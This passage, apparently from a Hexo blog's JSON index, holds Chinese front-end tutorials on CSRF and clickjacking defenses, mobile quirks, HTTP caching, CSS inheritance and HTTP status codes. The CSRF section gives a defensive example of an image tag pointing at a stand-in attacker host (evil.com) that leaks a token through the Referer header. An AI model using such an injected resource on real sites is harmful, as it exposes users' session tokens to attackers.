的更多详细资料：https://75team.com/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html 3、使用 Anti CSRF Token 比如一个删除操作的 URL 是：http://host/path/delete?uesrname=abc&amp;item=123 保持原参数不变，新增一个参数 Token，Token 值是随机的，不可预测 http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)] 由于 Token 的存在，攻击者无法再构造出一个完整的 URL 实施 CSRF 攻击 优点：比检查 Referer 方法更安全，并且不涉及用户隐私 缺点：对所有的请求都添加 Token 比较困难 更多关于 CSRF 详细可参考： CSRF 攻击的应对之道：https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/ CSRF 原理剖析：http://netsecurity.51cto.com/art/200812/102951.htm 维基百科 CSRF：https://en.wikipedia.org/wiki/Cross-site_request_forgery CSRF 实例：http://netsecurity.51cto.com/art/200812/102925.htm 需要注意的点： Token 需要足够随机，必须用足够安全的随机数生成算法 Token 应该为用户和服务器所共同持有，不能被第三方知晓 Token 可以放在用户的 Session 或者浏览器的 Cookie 中 尽量把 Token 放在表单中，把敏感操作由 GET 改为 POST，以 form 表单的形式提交，可以避免 Token 泄露（比如一个页面：http://host/path/manage?username=abc&amp;token=[random]，在此页面用户需要在这个页面提交表单或者单击 “删除” 按钮，才能完成删除操作，在这种场景下，如果这个页面包含了一张攻击者能指定地址的图片 &lt;img src=&quot;http://evil.com/notexist&quot; /&gt;，则这个页面地址会作为 HTTP 请求的 Refer 发送到 evil.com 的服务器上，从而导致 Token 泄露） XSRF 攻击 当网站同时存在 XSS 和 CSRF 漏洞时，XSS 可以模拟客户端浏览器执行任意操作，在 XSS 攻击下，攻击者完全可以请求页面后，读取页面内容中的 Token 值，然后再构造出一个合法的请求 结论 安全防御的体系应该是相辅相成、缺一不可的 3、点击劫持（ClickJacking）什么是点击劫持 点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，然后诱使用户在网页上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面。通过调整 iframe 页面的位置，可以诱使用户恰好点击在 iframe 页面的一些功能性按钮上。 防御点击劫持：X-Frame-OptionsX-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面能否在 &lt;frame&gt;、&lt;iframe&gt;、&lt;object&gt; 中展现的标记 有三个可选的值 DENY：浏览器会拒绝当前页面加载任何 frame 页面（即使是相同域名的页面也不允许） SAMEORIGIN：允许加载 frame 页面，但是 frame 页面的地址只能为同源域名下的页面 ALLOW-FROM：可以加载指定来源的 frame 页面（可以定义 frame 页面的地址） 浏览器的兼容性 小结 综合以上三大前端安全，我们可以总结 谨慎用户输入信息，进行输入检查（客户端和服务端同时检查） 在变量输出到 HTML 页面时，都应该进行编码或转义来预防 XSS 攻击 该用验证码的时候一定要添上 尽量在重要请求上添加 Token 参数，注意 Token 要足够随机，用足够安全的随机数生成算法","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"}]},{"title":"移动端常见兼容性问题及解决方案","slug":"mobile-web-capabiltiy-faq","date":"2018-08-07T08:26:09.000Z","updated":"2018-08-07T08:36:37.000Z","comments":true,"path":"archives/mobile-web-capabiltiy-faq.html","link":"","permalink":"https://hexo.bangz.me/archives/mobile-web-capabiltiy-faq.html","excerpt":"文章转自：常见移动端兼容性问题 1. IOS 移动端 click 事件 300ms 的延迟相应移动设备上的 web 网页是有 300ms 延迟的，往往会造成按钮点击延迟甚至是点击失效。 这是由于区分单机事件和双击屏幕缩放的历史原因造成的。","text":"文章转自：常见移动端兼容性问题 1. IOS 移动端 click 事件 300ms 的延迟相应移动设备上的 web 网页是有 300ms 延迟的，往往会造成按钮点击延迟甚至是点击失效。 这是由于区分单机事件和双击屏幕缩放的历史原因造成的。 解决方式： fastclick 可以解决在手机上点击事件的 300ms 延迟 zepto 的 touch 模块，tap 事件也是为了解决在 click 的延迟问题 触摸屏的相应顺序为 touchstart–&gt;touchmove–&gt;touchend–&gt;click，也可以通过绑定 ontouchstart 事件，加快事件的响应，解决 300ms 的延迟问题 2. 一些情况下对非可点击元素（label，span）监听 click 事件，iOS 下不会触发css 增加 cursor：pointer 就搞定了。 3. h5 底部输入框被键盘遮挡问题h5 页面有个很蛋疼的问题就是，当输入框在最底部，点击软键盘后输入框会被遮挡。可采用如下方式解决 12345678var oHeight = $(document).height(); // 浏览器当前的高度 $(window).resize(function()&#123; if ($(document).height() &lt; oHeight) &#123; $(\"#footer\").css(\"position\",\"static\"); &#125; else &#123; $(\"#footer\").css(\"position\",\"absolute\"); &#125;&#125;); 4. 不让 Android 手机识别邮箱1&lt;meta content=\"email=no\" name=\"format-detection\" /&gt; 5. 禁止 iOS 识别长串数字为电话1&lt;meta content=\"telephone=no\" name=\"format-detection\" /&gt; 6. 禁止 iOS 弹出各种操作窗口1-webkit-touch-callout:none 7. 消除 transition 闪屏12-webkit-transform-style: preserve-3d; /* 设置内嵌的元素在 3D 空间如何呈现：保留 3D*/-webkit-backface-visibility: hidden; /*(设置进行转换的元素的背面在面对用户时是否可见：隐藏)*/ 8. iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格可以通过正则去掉 1this.value = this.value.replace(/\\u2006/g, ''); 9. 禁止 ios 和 android 用户选中文字1-webkit-user-select:none 10. CSS 动画页面闪白, 动画卡顿解决方法: 尽可能地使用合成属性 transform 和 opacity 来设计 CSS3 动画，不使用 position 的 left 和 top 来定位 开启硬件加速 1234-webkit-transform: translate3d(0, 0, 0); -moz-transform: translate3d(0, 0, 0); -ms-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0); 11. fixed 定位缺陷 ios 下 fixed 元素容易定位出错，软键盘弹出时，影响 fixed 元素定位 android 下 fixed 表现要比 iOS 更好，软键盘弹出时，不会影响 fixed 元素定位 ios4 下不支持 position:fixed 解决方案：可用 iScroll 插件解决这个问题","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"},{"name":"CSS3","slug":"CSS3","permalink":"https://hexo.bangz.me/tags/CSS3/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"}]},{"title":"雅虎开发的 14 条军规","slug":"law-of-yahoo-web-development","date":"2018-07-30T08:44:17.000Z","updated":"2018-07-31T07:02:21.000Z","comments":true,"path":"archives/law-of-yahoo-web-development.html","link":"","permalink":"https://hexo.bangz.me/archives/law-of-yahoo-web-development.html","excerpt":"对于前端的性能优化，早期有雅虎的十四条军规作为思路导向，目的是为了从开发源头上减少后期性能优化的复杂度","text":"对于前端的性能优化，早期有雅虎的十四条军规作为思路导向，目的是为了从开发源头上减少后期性能优化的复杂度 尽可能减少 HTTP 请求数 使用内容分发网络 CDN 添加 Expire/Cache-Control 头：Add an Expires Header 启动 Gzip 压缩 将 CSS 放在页面最上面 将 script 放在页面最下面 避免在 CSS 中使用 Expressions 把 javascript 和 CSS 都放到外部文件中 减少 DNS 查询 压缩 javascript 和 CSS 避免重定向 移除重复的脚本 配置实体标签（ETags） 使 AJAX 缓存 参考资料Yahoo 前端优化十四条军规","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"HTTP","slug":"HTTP","permalink":"https://hexo.bangz.me/tags/HTTP/"}]},{"title":"HTTP 缓存机制（强缓存与协商缓存）","slug":"http-cache-tutorial","date":"2018-07-13T11:38:32.000Z","updated":"2018-07-13T12:25:49.000Z","comments":true,"path":"archives/http-cache-tutorial.html","link":"","permalink":"https://hexo.bangz.me/archives/http-cache-tutorial.html","excerpt":"浏览器缓存，也就是客户端缓存，是浏览器在本地磁盘对用户最近请求过的文档进行存储，当访问者再次访问同一页面时，浏览器就可以直接从本地磁盘加载文档。浏览器缓存既是网页性能优化里面静态资源相关优化的一大利器，也是无数 web 开发人员在工作过程不可避免的一大问题，所以在产品开发的时候我们总是想办法避免缓存产生，而在产品发布之时又在想策略管理缓存提升网页的访问速度。因此，了解缓存与控制缓存就显得非常重要了。","text":"浏览器缓存，也就是客户端缓存，是浏览器在本地磁盘对用户最近请求过的文档进行存储，当访问者再次访问同一页面时，浏览器就可以直接从本地磁盘加载文档。浏览器缓存既是网页性能优化里面静态资源相关优化的一大利器，也是无数 web 开发人员在工作过程不可避免的一大问题，所以在产品开发的时候我们总是想办法避免缓存产生，而在产品发布之时又在想策略管理缓存提升网页的访问速度。因此，了解缓存与控制缓存就显得非常重要了。 1. 浏览器缓存浏览器缓存分为两种，分别为 强缓存（也称本地缓存） 和 协商缓存（也称弱缓存）。 对于强缓存和协商缓存，判定过程如下： 浏览器加载资源时，先根据 response 的 header 中某些字段判断是否命中强缓存，若命中，浏览器直接从缓存中读取资源，不会发送请求到服务器。 当强缓存没有命中的时候，浏览器一定会发送一个请求到服务器，此时服务器根据 resquest 的 header 中某些字段判断是否命中协商缓存，若命中，服务器返回请求，但不会返回这个资源的数据，而是告诉客户端可以直接从缓存中加载这个资源。 对于强缓存和协商缓存，共同点在于，若命中，它们都是从客户端缓存中加载资源，而不是从服务器加载资源数据；而不同点在于，强缓存不发请求到服务器，协商缓存会发请求到服务器以咨询缓存是否过期。 普通刷新会启用协商缓存，忽略强缓存。只有在地址栏或收藏夹输入网址、通过链接引用资源等情况下，浏览器才会启用强缓存，这也是为什么有时候我们更新一张图片、一个 js 文件，页面内容依然是旧的，但是直接浏览器访问那个图片或文件，看到的内容却是新的。 2. 浏览器发送请求过程当浏览器 第一次发送请求 时，本地无缓存，向 web 服务器发送请求，服务器起端响应请求，浏览器端缓存。在第一次请求时，服务器会将页面最后修改时间通过 Last-Modified 标识由服务器发送给客户端，客户端记录修改时间；服务器还会生成一个 Etag，并发送给客户端。 当浏览器 再次发送请求 时：根据上图，浏览器在 第一次请求发生后，再次发送请求 时： 浏览器请求某一资源时，会先获取该资源缓存中 response 的 header 信息，然后根据 header 中的 Cache-Control 和 Expires 来判断是否过期。若没过期则直接从缓存中获取资源信息，包括缓存的 header 的信息，所以此次请求不会与服务器进行通信。这里判断是否过期，则是强缓存相关。 如果显示已过期，浏览器会向服务器端发送请求，这个请求会携带第一次请求返回的有关缓存的 header 字段信息，比如客户端会通过 If-None-Match 头将先前服务器端发送过来的 Etag 发送给服务器，服务会对比这个客户端发过来的 Etag 是否与服务器的相同，若相同，就将 If-None-Match 的值设为 false ，返回状态 304，客户端继续使用本地缓存，不解析服务器端发回来的数据，若不相同就将 If-None-Match 的值设为 true ，返回状态为 200，客户端重新机械服务器端返回的数据；客户端还会通过 If-Modified-Since 头将先前服务器端发过来的最后修改时间戳发送给服务器，服务器端通过这个时间戳判断客户端的页面是否是最新的，如果不是最新的，则返回最新的内容，如果是最新的，则返回 304 ，客户端继续使用本地缓存。 3. 强缓存 简而言之，强缓存就是在客户端进行验证本地缓存是否可用。强缓存是利用 http 头中的 Expires 和 Cache-Control 两个字段来控制的，用来表示资源的缓存时间。强缓存中，普通刷新会忽略它，但不会清除它；而强制刷新，请求会带上 Cache-Control:no-cache 和 Pragma:no-cache。 ExpiresExpires 是 http1.0 的规范，它的值是一个绝对时间的 GMT 格式的时间字符串，该时间代表着这个资源的失效时间，只要发送请求时间是在 Expires 之前，那么本地缓存始终有效，则在缓存中读取数据。因此这种方式有一个明显的缺点，由于失效的时间是一个绝对时间，所以当服务器与客户端时间偏差较大时，就会导致缓存混乱。如果同时出现 Cache-Control:max-age 和 Expires，那么 max-age 优先级更高。 12cache-control:max-age=691200expires:Fri, 14 Apr 2017 10:47:02 GMT 那么表示资源可以被缓存的最长时间为 691200 秒，会优先考虑 max-age。 Cache-ControlCache-Control 是在 http1.1 中出现的，是通用首部字段，既可用在 request 和 response。可以利用该字段的 max-age 值来进行判断，它是一个相对时间，例如 Cache-Control:max-age=3600，代表着资源的有效期是 3600 秒。对于 response 报文，cache-control 除了该字段外，还有下面几个比较常用的设置值： no-cache：不使用本地缓存。需要使用缓存协商，先与服务器确认返回的响应是否被更改，如果之前的响应中存在 ETag，那么请求的时候会与服务端验证，如果资源未被更改，则可以避免重新下载。 no-store：直接禁止浏览器缓存数据，每次用户请求该资源，都会向服务器发送一个请求，每次都会下载完整的资源。 public：可以被所有的用户缓存，包括终端用户和 CDN 等中间代理服务器。 private：只能被终端用户的浏览器缓存，不允许 CDN 等中继缓存服务器对其缓存。 协商缓存 简而言之，协商缓存就是想服务器发送请求以咨询本地缓存是否可用。协商缓存主要涉及两组 header 字段： Etag 和 If-None-Match、Last-Modified 和 If-Modified-Since。 Etag 和 If-None-MatchIf-None-Match 是 requset 报文的 header 中的一个字段，形如 if-xxx 这种样式的请求首部字段，都可称为条件请求。Etag 是 response 报文中 header 中的一个字段它是一种可将资源以字符串形式做唯一标识的方式，服务器会为每一份资源分配对应的 ETag 值。 其执行的过程如下： 当第一次发起 HTTP 请求时，服务器会为相应的资源返回一个 ETag 值。 当再次发起同一个请求时，客户端会在 request 的 header 中带上 If-None-Match ，而它的值就是 Etag 的值。 然后服务器会比对这个客服端发送过来的 Etag 是否与服务器的相同：若相同，就将 If-None-Match 的值设为 false ，返回状态为 304 ，并且服务器不返回该资源的数据，客户端继续使用本地缓存，不解析服务器返回的数据；若不相同，就将 If-None-Match 的值设为 true ，返回状态为 200 ，同时服务器返回该资源的新数据，客户端重新解析服务器返回的数据。 Last-Modify 和 If-Modify-SinceLast-Modify 是 response 报文的 header 中的一个字段，其值为时间，用于标识该资源的最后修改时间。If-Modify-Since 是 request 报文的 header 中的一个字段，其值也为时间。 其执行过程如下： 当第一次发起 HTTP 请求时，服务器 response 的 header 中包含 Last-Modify ，标明该资源的最后修改时间，如： 1Last-Modify: Thu,31 Dec 2037 23:59:59 GMT 当再次发起 HTTP 请求时，客户端 requset 的 header 中包含 If-Modify-Since 字段，该值为缓存之前服务器返回的 Last-Modify 的值，服务器收到 If-Modify-Since 后，根据资源的最后修改时间判断是否命中缓存。 如果命中缓存，则返回 304 ，并且不会返回资源内容，并且不会返回 Last-Modify 。 两者比较Last-Modified 与 Etag 类似。不过 Last-Modified 表示响应资源在服务器最后修改时间而已。与 Etag 相比，不足为： Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在 1 秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间； 如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存； 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。 而且，Etag 是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。 另外，Last-Modified 与 ETag 是可以一起使用的， 服务器会优先验证 ETag，一致的情况下，才会继续比对 Last-Modified，最后才决定是否返回 304。 参考资料 浏览器文件缓存优化策略HTTP 强缓存和协商缓存http 协商缓存 VS 强缓存浅析 HTTP 缓存的机制 - 浏览器缓存HTTP 缓存机制","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"HTTP","slug":"HTTP","permalink":"https://hexo.bangz.me/tags/HTTP/"}]},{"title":"CSS 中的继承属性与非继承属性","slug":"css-inherited-properties-and-non-inherited-properties","date":"2018-07-13T10:16:03.000Z","updated":"2018-07-13T12:26:08.000Z","comments":true,"path":"archives/css-inherited-properties-and-non-inherited-properties.html","link":"","permalink":"https://hexo.bangz.me/archives/css-inherited-properties-and-non-inherited-properties.html","excerpt":"当我们参考 CSS 规范时，就会发现每个属性中都指出了 Inherited 的值，即是否可继承。这决定了当你还没有为元素的属性指定值时该如何计算值。今天我们就大概的说说 CSS 中的继承属性与非继承属性。 1. 继承属性 (inherited property)当元素的一个继承属性没有指定值时，则取父元素的同属性的计算值。只有文档根元素取该属性的概述中给定的初始值。下面我们举一个简单的例子:","text":"当我们参考 CSS 规范时，就会发现每个属性中都指出了 Inherited 的值，即是否可继承。这决定了当你还没有为元素的属性指定值时该如何计算值。今天我们就大概的说说 CSS 中的继承属性与非继承属性。 1. 继承属性 (inherited property)当元素的一个继承属性没有指定值时，则取父元素的同属性的计算值。只有文档根元素取该属性的概述中给定的初始值。下面我们举一个简单的例子: 典型例子: color 属性 1p &#123; color: orange; &#125; HTML:1&lt;p&gt; I am a &lt;em&gt;smile&lt;/em&gt; girl. &lt;/p&gt; 这里你就会发现 “smile” 文本将呈现橙色，原因是 em 元素继承了 p 元素的 color 属性的值。 常见的继承属性 那么，有哪些我们常见的继承属性呢？这里我给大家例举一下: border-collapse border-spacing caption-side color cursor direction font (其中包括 font-family , font-size , font-weight , font-style) letter-spacing line-height list-style (其中包括 list-style-image , list-style-position , list-style-type) text-align text-indent text-transform visibility white-space word-spacing 大家有没有发现一些字体呀，文本呀，颜色等的设置都是可继承属性 ~ 参考地址 2. 非继承属性 (reset property)当元素的一个非继承属性没有指定值时，则取属性的初始值。 典型例子: border 属性1p &#123; border: medium solid &#125; HTML:1&lt;p&gt; I am a &lt;em&gt;smile&lt;/em&gt; girl. &lt;/p&gt; 这时你就会发现文本 “smile” 没有边框，原因是 border 属性为不可继承属性，其初始值为 none。 常见的非继承属性 这里例举几个常见的非继承属性: z-index width (其中包括 min-width , max-width) dispaly float clear vertical-align unicode-bidi position top bottom left right text-decoration background (其中包括 background-color , background-image , background-position , background-attachment , background-repeat) border (其中包括 border-color , border-style , border-width , border-spacing and so on) padding (其中包括 padding-left , padding-right , padding-top , padding-bottom) margin (其中包括 margin-left , margin-right , margin-top , margin-bottom) outline (其中包括 outline-color , outline-style , outline-width) clip content 非继承属性大部分都是一些和定位呀，浮动呀，盒子模型呀等有关 ~ 参考地址","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"},{"name":"CSS3","slug":"CSS3","permalink":"https://hexo.bangz.me/tags/CSS3/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"}]},{"title":"小程序实现原理链接集合","slug":"principle-of-wechat-miniprogram","date":"2018-07-13T07:18:04.000Z","updated":"2018-07-13T11:41:23.000Z","comments":true,"path":"archives/principle-of-wechat-miniprogram.html","link":"","permalink":"https://hexo.bangz.me/archives/principle-of-wechat-miniprogram.html","excerpt":"","text":"小程序实现原理解析「微信小程序」剖析（二）：框架原理 | 在浏览器上运行的猜想运行环境差异移动 Web 开发之浏览器Blink 引擎相对于 WebKit 好在哪里？ 《微信小程序架构解析》丨 NOTES微信安卓端小程序逆向分析–它山之石可以攻玉","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"},{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"},{"name":"小程序","slug":"小程序","permalink":"https://hexo.bangz.me/tags/小程序/"}]},{"title":"事件 DOMContentLoaded 和 load 的区别","slug":"difference-between-domcontentloaded-and-load","date":"2018-07-10T09:17:54.000Z","updated":"2018-07-12T08:08:46.000Z","comments":true,"path":"archives/difference-between-domcontentloaded-and-load.html","link":"","permalink":"https://hexo.bangz.me/archives/difference-between-domcontentloaded-and-load.html","excerpt":"他们的区别是，触发的时机不一样，先触发 DOMContentLoaded 事件，后触发 load 事件。 DOM 文档加载的步骤为 解析 HTML 结构。 加载外部脚本和样式表文件。 解析并执行脚本代码。 DOM 树构建完成。//DOMContentLoaded //jQuery.ready 加载图片等外部文件。 页面加载完毕。//load 在第 4 步，会触发 DOMContentLoaded 事件。在第 6 步，触发 load 事件。","text":"他们的区别是，触发的时机不一样，先触发 DOMContentLoaded 事件，后触发 load 事件。 DOM 文档加载的步骤为 解析 HTML 结构。 加载外部脚本和样式表文件。 解析并执行脚本代码。 DOM 树构建完成。//DOMContentLoaded //jQuery.ready 加载图片等外部文件。 页面加载完毕。//load 在第 4 步，会触发 DOMContentLoaded 事件。在第 6 步，触发 load 事件。 用原生 js 可以这么写 1234// 不兼容老的浏览器，兼容写法见 [jQuery 中 ready 与 load 事件](http://www.imooc.com/code/3253)，或用 jQuerydocument.addEventListener(\"DOMContentLoaded\", function() &#123; // ... 代码...&#125;, false); 123window.addEventListener(\"load\", function() &#123; // ... 代码...&#125;, false); 用 jQuery 这么写1234// DOMContentLoaded$(document).ready(function() &#123; // ... 代码...&#125;); 12345//load $(document).load(function() &#123; // ... 代码...&#125;);// 貌似 1.8 版本之后, load 就抛弃了. 只能用 window.onload() 或者 addEventListener 这两个事件监听页面加载完成 参考资料： 事件 DOMContentLoaded 和 load 的区别 JS、CSS 以及 img 对 DOMContentLoaded 事件的影响 DOMContentLoaded - 事件类型一览表 | MDN DOMContentLoaded 与 load 的区别","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"}]},{"title":"JS 事件循环资料集合","slug":"event-loop-tutorial-links","date":"2018-07-10T08:08:36.000Z","updated":"2018-07-13T07:07:47.000Z","comments":true,"path":"archives/event-loop-tutorial-links.html","link":"","permalink":"https://hexo.bangz.me/archives/event-loop-tutorial-links.html","excerpt":"","text":"深入探究 eventloop 与浏览器渲染的时序问题 JavaScript 运行机制详解：再谈 Event Loop Event Loop 的规范和实现 深入理解 js 事件循环机制（Node.js 篇） 深入理解 js 事件循环机制（浏览器篇） 理解事件循环一 (浅析) 理解事件循环二 (macrotask 和 microtask) JavaScript 并发模型与 Event Loop Event Loop 中的 microtask 与 macrotask HTML 系列：macrotask 和 microtask 聊聊 JavaScript 与浏览器的那些事 - 引擎与线程 js 引擎与 GUI 引擎是互斥的","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"}]},{"title":"display: none 和 visibility: hidden 的区别","slug":"difference-between-display-none-and-visibility-hidden","date":"2018-07-10T06:37:56.000Z","updated":"2018-08-07T09:09:36.000Z","comments":true,"path":"archives/difference-between-display-none-and-visibility-hidden.html","link":"","permalink":"https://hexo.bangz.me/archives/difference-between-display-none-and-visibility-hidden.html","excerpt":"display:none 和 visibility: hidden 都是 CSS 中用于隐藏元素的属性，但他们在具体的场景上还是有一些区别： 1. 继承属性的差异 display: none 是非继承属性，一旦设置后，就算修改其子元素 display 属性的值也不会显示。 visibility: hidden 是继承属性，其子节点会继承 visibility 属性的值，若修改其子节点的 visibility 为 visibile，则子节点会重新显示","text":"display:none 和 visibility: hidden 都是 CSS 中用于隐藏元素的属性，但他们在具体的场景上还是有一些区别： 1. 继承属性的差异 display: none 是非继承属性，一旦设置后，就算修改其子元素 display 属性的值也不会显示。 visibility: hidden 是继承属性，其子节点会继承 visibility 属性的值，若修改其子节点的 visibility 为 visibile，则子节点会重新显示 2. 是否占据渲染空间 display: none 仅会存在于 DOM 树中，并不存在于渲染树中，\b不会占据渲染空间 visibility: hidden 既存在于 DOM 树中，也存在于渲染树中，会占据渲染空间 3. 修改属性所导致的重绘 修改 display 属性的值会导致文档重排 (reflow)，重新计算样式并生成渲染树 修改 visibility 属性的值仅会产生局部重绘 (repaint)，不需要重新生成渲染树 参考资料： What is DOM reflow? What forces layout / reflow display: none; 与 visibility: hidden; 的区别 回流、重绘及其优化 浏览器中的回流，重绘 百万数据如何在前端快速流畅显示？","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"CSS3","slug":"CSS3","permalink":"https://hexo.bangz.me/tags/CSS3/"},{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"}]},{"title":"Vue 数据驱动原理教程链接集合","slug":"vue-data-driving-tutorial-links","date":"2018-07-10T04:34:05.000Z","updated":"2018-07-10T08:00:42.000Z","comments":true,"path":"archives/vue-data-driving-tutorial-links.html","link":"","permalink":"https://hexo.bangz.me/archives/vue-data-driving-tutorial-links.html","excerpt":"文档： Vue 技术揭秘 剖析 Vue 实现原理 - 如何实现双向绑定 mvvm","text":"文档： Vue 技术揭秘 剖析 Vue 实现原理 - 如何实现双向绑定 mvvm 监听数据变化： VUE2.0 如何追踪数据变化？ Vue 源码学习之一：监听数据对象变化 实现从 VDOM 到 DOM： Vue 2.0 的 virtual-dom 实现简析 Vue2.1.7 源码学习 一、createElement(): 用 JavaScript 对象 (虚拟树) 描述 真实 DOM 对象 (真实树) 二、diff(oldNode, newNode) : 对比新旧两个虚拟树的区别，收集差异 &lt; br&gt; 三、patch() : 将差异应用到真实 DOM 树 监听 DOM 表单元素变化： Vue.js 双向绑定的实现原理 从 vue.js 的源码分析，input 和 textarea 上的 v-model 指令到底做了什么 其他： vue2 实现 div contenteditable=”true” 类似于 v-model 的效果 如何理解 v-model 就是语法糖？ Vue 进阶教程之：详解 v-model 如何监听页面 DOM 变动并高效响应（事件委托）","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"https://hexo.bangz.me/tags/Vue/"}]},{"title":"HTTP 面试指南","slug":"http-quick-guide","date":"2018-07-03T02:34:52.000Z","updated":"2018-07-13T11:41:17.000Z","comments":true,"path":"archives/http-quick-guide.html","link":"","permalink":"https://hexo.bangz.me/archives/http-quick-guide.html","excerpt":"HTTP 状态码HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP 状态码共分为 5 种类型： 1xx 信息，服务器收到请求，需要请求者继续执行操作 2xx 成功，操作被成功接收并处理 3xx 重定向，需要进一步的操作以完成请求 4xx 客户端错误，请求包含语法错误或无法完成请求 5xx 服务器错误，服务器在处理请求的过程中发生了错误","text":"HTTP 状态码HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP 状态码共分为 5 种类型： 1xx 信息，服务器收到请求，需要请求者继续执行操作 2xx 成功，操作被成功接收并处理 3xx 重定向，需要进一步的操作以完成请求 4xx 客户端错误，请求包含语法错误或无法完成请求 5xx 服务器错误，服务器在处理请求的过程中发生了错误 完整的 HTTP 状态码表1xx ———— 信息状态码 状态码 状态名 状态描述 100 Continue 服务器已经接收到请求头，并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如，POST 请求），或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。要使服务器检查请求的头部，客户端必须在其初始请求中发送 Expect: 100-continue 作为头部，并在发送正文之前接收 100 Continue 状态代码。响应代码 417 期望失败表示请求不应继续。 101 Switching Protocols 服务器已经理解了客户端的请求，并将通过 Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在 Upgrade 消息头中定义的那些协议。 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的 HTTP 版本（如 HTTP/2）比旧版本更有优势，或者切换到一个实时且同步的协议（如 WebSocket）以传送利用此类特性的资源。 102 Processing WebDAV 请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示​​服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失。 2xx ———— 成功状态码 状态码 状态名 状态描述 200 OK 请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在 GET 请求中，响应将包含与请求的资源相对应的实体。在 POST 请求中，响应将包含描述或操作结果的实体。 201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而创建，且其 URI 已经随 Location 头信息返回。假如需要的资源无法及时创建的话，应当返回’202 Accepted’。 202 Accepted 服务器已接受请求，但尚未处理。最终该请求可能会也可能不会被执行，并且可能在处理发生时被禁止。 203 Non-Authoritative Information 服务器是一个转换代理服务器（transforming proxy，例如网络加速器），以 200 OK 状态码为起源，但回应了原始响应的修改版本。 204 No Content 服务器成功处理了请求，没有返回任何内容。 205 Reset Content 服务器成功处理了请求，但没有返回任何内容。与 204 响应不同，此响应要求请求者重置文档视图。 206 Partial Content 服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。 207 Multi-Status 代表之后的消息体将是一个 XML 消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。 208 Already Reported DAV 